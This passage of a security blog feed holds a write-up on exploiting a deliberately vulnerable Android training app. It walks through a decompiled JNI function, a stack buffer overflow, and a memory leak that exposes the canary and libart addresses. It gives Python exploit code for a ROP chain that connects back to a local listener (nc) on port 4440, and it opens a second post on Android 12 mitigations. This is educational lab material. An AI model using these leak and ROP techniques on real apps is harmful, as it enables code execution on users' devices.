&lt;/code>&lt;/pre>&lt;/div>&lt;p>Okay, time for &lt;em>Ghidra&lt;/em>! The following code has already been &amp;ldquo;beautified&amp;rdquo;:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">jbyteArray &lt;span style="color:#a6e22e">Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper&lt;/span>
(JNIEnv &lt;span style="color:#f92672">*&lt;/span>env, jobject this, jbyteArray string, jint length)
{
&lt;span style="color:#66d9ef">char&lt;/span> c;
jbyte &lt;span style="color:#f92672">*&lt;/span>raw;
jsize stringLength;
jbyteArray array;
&lt;span style="color:#66d9ef">long&lt;/span> fs;
uint i;
&lt;span style="color:#66d9ef">int&lt;/span> bufferLength;
&lt;span style="color:#66d9ef">char&lt;/span> buffer [&lt;span style="color:#ae81ff">40&lt;/span>];
&lt;span style="color:#66d9ef">long&lt;/span> canary;
canary &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(fs &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>);
memset(buffer,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0x20&lt;/span>);
raw &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements)(env,string,(jboolean &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x0&lt;/span>);
stringLength &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength)(env,string);
perfect_memcpy(buffer,raw,(&lt;span style="color:#66d9ef">int&lt;/span>)stringLength);
&lt;span style="color:#66d9ef">for&lt;/span> (i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>; i &lt;span style="color:#f92672">=&lt;/span> i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
buffer[i] &lt;span style="color:#f92672">=&lt;/span> toupper((&lt;span style="color:#66d9ef">int&lt;/span>)buffer[i]);
&lt;span style="color:#66d9ef">if&lt;/span> ((&lt;span style="color:#66d9ef">int&lt;/span>)length &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x101&lt;/span>)
bufferLength &lt;span style="color:#f92672">=&lt;/span> perfect_strlen(buffer) &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)length;
&lt;span style="color:#66d9ef">else&lt;/span>
bufferLength &lt;span style="color:#f92672">=&lt;/span> perfect_strlen(buffer);
array &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray)(env,(jsize)bufferLength);
(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion)(env,array,&lt;span style="color:#ae81ff">0&lt;/span>,(jsize)bufferLength,buffer);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(fs &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> canary)
&lt;span style="color:#66d9ef">return&lt;/span> array;
&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
__stack_chk_fail();
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">perfect_memcpy&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>dst, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>src, uint size)
{
uint i;
&lt;span style="color:#66d9ef">for&lt;/span> (i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> size; i &lt;span style="color:#f92672">=&lt;/span> i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
dst[i] &lt;span style="color:#f92672">=&lt;/span> src[i];
&lt;span style="color:#66d9ef">return&lt;/span>;
}
uint &lt;span style="color:#a6e22e">perfect_strlen&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>string)
{
uint i;
&lt;span style="color:#66d9ef">for&lt;/span> (i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; string[i] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>; i &lt;span style="color:#f92672">=&lt;/span> i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) {}
&lt;span style="color:#66d9ef">return&lt;/span> i;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="the-bug">The Bug&lt;/h2>
&lt;p>As the module name suggests, there is indeed a buffer overflow bug. One function that is often part of a buffer overflow is &lt;code>memcpy&lt;/code>. Thus, taking a closer look into how &lt;code>memcpy&lt;/code> is used can turn out useful.&lt;/p>
&lt;h3 id="buffer-overflow">Buffer Overflow&lt;/h3>
&lt;p>First of all, we can see that there is a classical buffer overflow:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">...
memset(buffer,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0x20&lt;/span>);
raw &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements)(env,string,(jboolean &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x0&lt;/span>);
stringLength &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength)(env,string);
perfect_memcpy(buffer,raw,(&lt;span style="color:#66d9ef">int&lt;/span>)stringLength);
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This is due to the fact that &lt;code>stringLength&lt;/code> is computed w.r.t. the length of the input buffer &lt;code>string&lt;/code>, but not w.r.t. the length of the destination buffer &lt;code>buffer&lt;/code>. Thus, if &lt;code>length &amp;gt; 0x20&lt;/code>, a classical buffer overflow occurs. Notice that the user has complete control over the contents and length of &lt;code>string&lt;/code>, which is actually of type &lt;code>jbyteArray&lt;/code>.&lt;/p>
&lt;h3 id="memory-leaks">Memory Leak(s)&lt;/h3>
&lt;p>In addition to the ability of manipulating the whole stack located above &lt;code>buffer&lt;/code>, there is a weird sequence of code leading to returning more than &amp;ldquo;intended&amp;rdquo;. Namely:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">...
&lt;span style="color:#66d9ef">if&lt;/span> ((&lt;span style="color:#66d9ef">int&lt;/span>)length &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x101&lt;/span>)
bufferLength &lt;span style="color:#f92672">=&lt;/span> perfect_strlen(buffer) &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)length;
&lt;span style="color:#66d9ef">else&lt;/span>
bufferLength &lt;span style="color:#f92672">=&lt;/span> perfect_strlen(buffer);
array &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray)(env,(jsize)bufferLength);
(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion)(env,array,&lt;span style="color:#ae81ff">0&lt;/span>,(jsize)bufferLength,buffer);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(fs &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> canary)
&lt;span style="color:#66d9ef">return&lt;/span> array;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>So if &lt;code>length &amp;lt;= 0x100&lt;/code>, then it will be added to &lt;code>bufferLength&lt;/code>. Technically, setting &lt;code>length &amp;lt; 0&lt;/code> or &lt;code>length &amp;lt; -perfect_strlen(buffer)&lt;/code> is possible, but does not seem very useful at first glance. Then, &lt;code>bufferLength&lt;/code> bytes are copied from &lt;code>buffer&lt;/code> into &lt;code>array&lt;/code>. As &lt;code>strlen(buffer) + length &amp;gt; 0x20 = sizeof (buffer)&lt;/code> is possible, this might leak arbitrary values from the stack coming after the buffer.&lt;/p>
&lt;p>Summing up, if we sent a payload of the form&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">client&lt;span style="color:#f92672">.&lt;/span>forward(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x42&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>)
client&lt;span style="color:#f92672">.&lt;/span>forward(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x01\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>) &lt;span style="color:#75715e"># big - endian&lt;/span>
leak &lt;span style="color:#f92672">=&lt;/span> client&lt;span style="color:#f92672">.&lt;/span>fetch()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>we would get an additional &lt;code>0x100&lt;/code> bytes from the memory located above &lt;code>buffer&lt;/code>, i.e. from the stack. This leaks, among other things&lt;/p>
&lt;ol>
&lt;li>Return address to &lt;code>art_quick_generic_jni_trampoline&lt;/code>, which leaks the base of &lt;code>libart.so&lt;/code> (almost as awesome as &lt;code>libc.so&lt;/code>&amp;hellip;as regards gadgets)&lt;/li>
&lt;li>Old &lt;code>rbp&lt;/code>, i.e. a stack pointer&lt;/li>
&lt;/ol>
&lt;h2 id="exploitation-">Exploitation &amp;gt;:)&lt;/h2>
&lt;p>Lets assume we already have a leaked &lt;code>libart.so&lt;/code> pointer, i.e. we ran:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">client&lt;span style="color:#f92672">.&lt;/span>forward(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x42&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>)
client&lt;span style="color:#f92672">.&lt;/span>forward(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x01\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
leak &lt;span style="color:#f92672">=&lt;/span> client&lt;span style="color:#f92672">.&lt;/span>fetch()
leak &lt;span style="color:#f92672">=&lt;/span> decompose(leak[&lt;span style="color:#ae81ff">0x20&lt;/span>:])
canary &lt;span style="color:#f92672">=&lt;/span> leak[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;span style="color:#75715e"># libart.so address of art_quick_generic_jni_trampoline+220,&lt;/span>
&lt;span style="color:#75715e"># i.e. at file offset 0x39ffac (may differ)&lt;/span>
libart_base &lt;span style="color:#f92672">=&lt;/span> p64(u64(leak[&lt;span style="color:#ae81ff">3&lt;/span>]) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x39ffac&lt;/span>)
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">decompose&lt;/span>(leak : bytes):
&lt;span style="color:#66d9ef">return&lt;/span> [ leak[i &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>:(i&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>] &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(leak) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) ]
&lt;/code>&lt;/pre>&lt;/div>&lt;p>To figure out that the second qword is the canary, just iterate over the decomposed leak and look for &lt;em>not - address - looking&lt;/em> values. I always encountered fully random canaries, i.e. 8 random bytes, which seem to be the &lt;a href="https://link.springer.com/article/10.1007/s10207-018-00425-8">default on Android&lt;/a>. But this will only be relevant in case e.g. &lt;code>strcpy&lt;/code> is used instead of e.g. &lt;code>memcpy&lt;/code>.&lt;/p>
&lt;p>Using your favourite tool for gadget extraction, like &lt;a href="https://github.com/sashs/Ropper">&lt;em>ropper&lt;/em>&lt;/a> or &lt;a href="https://github.com/JonathanSalwan/ROPgadget">&lt;em>ROPgadget&lt;/em>&lt;/a>, you can construct a ROP - chain to get arbitrary code execution. Basically, your payload could look like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x42&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> leak[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#75715e"># &amp;lt;-- unknown address&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> canary
payload &lt;span style="color:#f92672">+=&lt;/span> leak[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#75715e"># &amp;lt;-- probably old rbp&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_1
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_2
payload &lt;span style="color:#f92672">+=&lt;/span> enjoy
&lt;span style="color:#f92672">...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>because the leaked data from the stack looked like this (from low to high addresses):&lt;/p>
&lt;pre tabindex="0">&lt;code>lower 0x72d1b9cdc210 &amp;lt;-- unknown address
| 0x79291c4ee3e94be3 &amp;lt;-- that is the canary
| 0x72d08b1c28b0 &amp;lt;-- probably old rbp
higher 0x72d0f87a032c &amp;lt;-- this is your most favourite address to leak
&lt;/code>&lt;/pre>&lt;p>Notice that we do not need to care about the &lt;em>unknown&lt;/em> address, because we are almost done.&lt;/p>
&lt;p>Lets briefly think about how to approach the holy grail, i.e. &lt;em>arbitrary code execution&lt;/em>. At first glance, a few options come to mind (consider the fact that e.g. &lt;code>libart.so&lt;/code> is compiled with &lt;em>RELRO&lt;/em> etc.):&lt;/p>
&lt;ol>
&lt;li>ROP - chain that contains &lt;strong>all&lt;/strong> the &amp;ldquo;code&amp;rdquo; (via gadgets) to execute. This (almost irreversibly) destroys the stack and you cannot expect that the app will recover from that.&lt;/li>
&lt;li>smaller ROP - chain that writes some qwords into global memory (e.g. &lt;code>.data@libart.so&lt;/code> or &lt;code>.bss@libart.so&lt;/code>) and then restores the stack.&lt;/li>
&lt;li>smaller ROP - chain that allocates writable and executable memory via e.g. &lt;code>mmap&lt;/code>, writes the pointer returned in &lt;code>rax&lt;/code> into global memory (thus only 8 bytes of global memory are invalidated). Then proceed as in 2. just with the new memory to write shellcode. Finally return into the shellcode.&lt;/li>
&lt;li>&lt;a href="https://en.wikipedia.org/wiki/Sigreturn-oriented_programming">sigrop&lt;/a>, but there is no reason to use this.&lt;/li>
&lt;/ol>
&lt;p>For this blog post, we will only consider the first option, i.e. destroying the stack (don&amp;rsquo;t worry the other ones will be covered in later posts ;D).&lt;/p>
&lt;p>The naming convention for gadgets is like this: &lt;code>gadget_opcode_operand1_operand2_opcode_operand1...&lt;/code>. So you need to be able to identify opcodes on Intel (the emulator runs on x86_64) to understand the ROP - chain. The following is an example of a ROP - chain connecting to &lt;code>10.0.2.2:4440&lt;/code>, where &lt;code>10.0.2.2&lt;/code> is &lt;a href="https://developer.android.com/studio/run/emulator-networking.html">an alias to your loopback interface&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># Setup payload&lt;/span>
payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> leak[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#75715e"># &amp;lt;-- unknown address&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> canary
payload &lt;span style="color:#f92672">+=&lt;/span> leak[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#75715e"># &amp;lt;-- probably old rbp&lt;/span>
&lt;span style="color:#75715e"># Dynamically compute libc address via toupper@.got in libStackBufferOverflowModule.so&lt;/span>
&lt;span style="color:#75715e"># and store it into writable_memory&lt;/span>
payload &lt;span style="color:#f92672">=&lt;/span> compute_libc_base(payload, writable_memory)
payload &lt;span style="color:#f92672">=&lt;/span> call_libc_function(
payload,
writable_memory,
&lt;span style="color:#e6db74">&amp;#39;socket&amp;#39;&lt;/span>,
[
p64(&lt;span style="color:#ae81ff">0x2&lt;/span>),
p64(&lt;span style="color:#ae81ff">0x1&lt;/span>),
p64(&lt;span style="color:#ae81ff">0x0&lt;/span>)
]
)
&lt;span style="color:#75715e"># Store socket in memory&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rdi
payload &lt;span style="color:#f92672">+=&lt;/span> p64(u64(writable_memory) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x8&lt;/span>)
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_deref_rdi_rax
&lt;span style="color:#75715e"># Construct sockaddr_in&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rdi
payload &lt;span style="color:#f92672">+=&lt;/span> p64(u64(writable_memory) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span>)
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rax
payload &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x02\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x11\x58&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x0a\x00\x02\x02&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_deref_rdi_rax
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rdi
payload &lt;span style="color:#f92672">+=&lt;/span> p64(u64(writable_memory) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x18&lt;/span>)
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rax
payload &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x8&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_deref_rdi_rax
&lt;span style="color:#75715e"># Connect to 10.0.2.2:4440&lt;/span>
&lt;span style="color:#75715e"># rdx = size&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rdx
payload &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x10&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x7&lt;/span>
&lt;span style="color:#75715e"># rsi = addr of socketaddr_in&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rsi
payload &lt;span style="color:#f92672">+=&lt;/span> p64(u64(writable_memory) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span>)
&lt;span style="color:#75715e"># rdi = sockfd&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rdi
payload &lt;span style="color:#f92672">+=&lt;/span> p64(u64(writable_memory) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x8&lt;/span>)
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_rax_deref_rdi
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_rdi_rax_pop_rax
payload &lt;span style="color:#f92672">+=&lt;/span> writable_memory
&lt;span style="color:#75715e"># Call function --&amp;gt; syscall instead of libc call, because this returns errno&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rax
payload &lt;span style="color:#f92672">+=&lt;/span> p64(&lt;span style="color:#ae81ff">0x2a&lt;/span>)
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_syscall
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Lets take a step back and see the individual steps the ROP - chain performs:&lt;/p>
&lt;ol>
&lt;li>&lt;code>compute_libc_base&lt;/code> computes the base address of &lt;code>libc.so&lt;/code> by &amp;ldquo;leaking&amp;rdquo; a &lt;code>libc.so&lt;/code> address from &lt;code>.got@libStackBufferOverflowModule.so&lt;/code> into a register and writing that address into &lt;code>writable_memory&lt;/code>&lt;/li>
&lt;li>&lt;code>call_libc_function&lt;/code> calls &lt;code>socket@libc.so&lt;/code> and puts the file descriptor into &lt;code>writable_memory+0x8&lt;/code>&lt;/li>
&lt;li>Then a structure of type &lt;code>struct sockaddr_in&lt;/code> is crafted in global memory and describes where to connect to.&lt;/li>
&lt;li>Finally &lt;code>connect@syscall&lt;/code> is called. At least on my end, calling &lt;code>connect@libc.so&lt;/code> caused an error. This might be due to the fact that we wrote into global memory located in &lt;code>libart.so&lt;/code> (&amp;hellip; whyever that would be the case though). For this PoC, we just need the app to perform a connection. Therefore we can use a system call to do so. We did &lt;strong>not&lt;/strong> use a system call to create the socket, as there where no gadgets of the form &lt;code>syscall; ret&lt;/code> (or &lt;em>ropper&lt;/em> did not tell me). Thus, after the &lt;code>syscall&lt;/code> gadget, the behaviour of the app is undefined.&lt;/li>
&lt;/ol>
&lt;p>To catch the PoC, run the following command on your local machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -lvnp &lt;span style="color:#ae81ff">4440&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now one might argue: &amp;ldquo;Why don&amp;rsquo;t we just run a classical &lt;code>execve&lt;/code> ROP - chain?&amp;rdquo;.&lt;/p>
&lt;p>The answer to that lies in the implementation of &lt;em>DamnVulnerableApp&lt;/em>. The manager app will &lt;em>clean up&lt;/em> the vulnerable process, if the connection between them breaks. Observe that calling &lt;code>execve&lt;/code> will definitely destroy the connection between the vulnerable app and the manager app. This forces the manager app to send a &lt;code>SIGKILL&lt;/code> to the vulnerable app, thus ending its life even before the program to be executed via &lt;code>execve&lt;/code> is initialized. As &lt;code>execve&lt;/code> does not create a new process (and creating a new process might even violate the permissions of the vulnerable app), i.e. the PID stays the same, the manager app will always shutdown &lt;code>execve&lt;/code> attempts. Also one could argue that it is better practice to keep the target app alive for stealth - reasons.&lt;/p>
&lt;h1 id="conclusion">Conclusion&lt;/h1>
&lt;p>In summary, the &lt;em>EasyStackBufferOverflowModule&lt;/em> can be exploited by using a classical ROP - chain after leaking enough information. It is possible to get &lt;em>arbitrary code execution&lt;/em> limited only by the constraints that &lt;em>DamnVulnerableApp&lt;/em> (and its permissions and security mechanisms) imposes.&lt;/p></content></item><item><title>E²VA: Android Basics (Part 2)</title><link>https://lolcads.github.io/posts/2024/07/eva_1/</link><pubDate>Mon, 22 Jul 2024 16:46:21 +0100</pubDate><guid>https://lolcads.github.io/posts/2024/07/eva_1/</guid><description>Android Binary Exploitation In this post, we will examine security mechanisms that Android 12 employs in order to make binary exploitation a bit harder. Also, we will discuss how to get to certain information like shared - object files that are necessary for successful exploitation. The latter will be generalized to getting limited source code access to an app given a corresponding .apk file.
Environment Before diving into details, the technical setup has to be clarified.</description><content>&lt;h1 id="android-binary-exploitation">Android Binary Exploitation&lt;/h1>
&lt;p>In this post, we will examine security mechanisms that Android 12 employs in order to make binary exploitation a bit harder. Also, we will discuss how to get to certain information like shared - object files that are necessary for successful exploitation. The latter will be generalized to getting limited source code access to an app given a corresponding &lt;code>.apk&lt;/code> file.&lt;/p>
&lt;h2 id="environment">Environment&lt;/h2>
&lt;p>Before diving into details, the technical setup has to be clarified. All of the following observations on security mechanisms were encountered on a x86_64 Pixel 3 emulator running Android 12 (build number is &lt;a href="https://source.android.com/docs/setup/about/build-numbers#build-ids-defined">&lt;code>SE1A.220203.002.A1&lt;/code>&lt;/a>). When referencing source code from &lt;em>Android Open Source Project&lt;/em> (AOSP), it will be w.r.t. &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:">Android 12.0.0_r31&lt;/a>. The build variant for &lt;em>damnvulnerableapp&lt;/em> is currently only &lt;code>debug&lt;/code>. Also there is no GooglePlay enabled as we require root on the device for debugging purposes only.&lt;/p>
&lt;p>In addition to that, standard compilation configurations of &lt;a href="https://developer.android.com/studio">&lt;em>Android Studio&lt;/em>&lt;/a> are used to construct the app and compile native code. The version of &lt;em>Android Studio&lt;/em> is as follows:&lt;/p>
&lt;ul>
&lt;li>Android Studio Dolphin | 2021.3.1&lt;/li>
&lt;li>Build #AI-213.7172.25.2113.9014738, built on August 31, 2022&lt;/li>
&lt;li>Runtime version: 11.0.13+0-b1751.21-8125866 amd64&lt;/li>
&lt;li>VM: OpenJDK 64-Bit Server VM by JetBrains s.r.o.&lt;/li>
&lt;li>Linux 5.15.0-46-generic&lt;/li>
&lt;li>GC: G1 Young Generation, G1 Old Generation&lt;/li>
&lt;li>Memory: 2048M&lt;/li>
&lt;li>Cores: 12&lt;/li>
&lt;li>Registry:
&lt;ul>
&lt;li>external.system.auto.import.disabled=true&lt;/li>
&lt;li>debugger.watches.in.variables=false&lt;/li>
&lt;li>ide.text.editor.with.preview.show.floating.toolbar=false&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Current Desktop: ubuntu:GNOME&lt;/li>
&lt;/ul>
&lt;p>If your environment differs even in the slightest way, you might need different offsets, addresses etc. to get your exploits to work. Thus, if I presents exploit sketches, &lt;strong>do not assume that they work out of the box!&lt;/strong>&lt;/p>
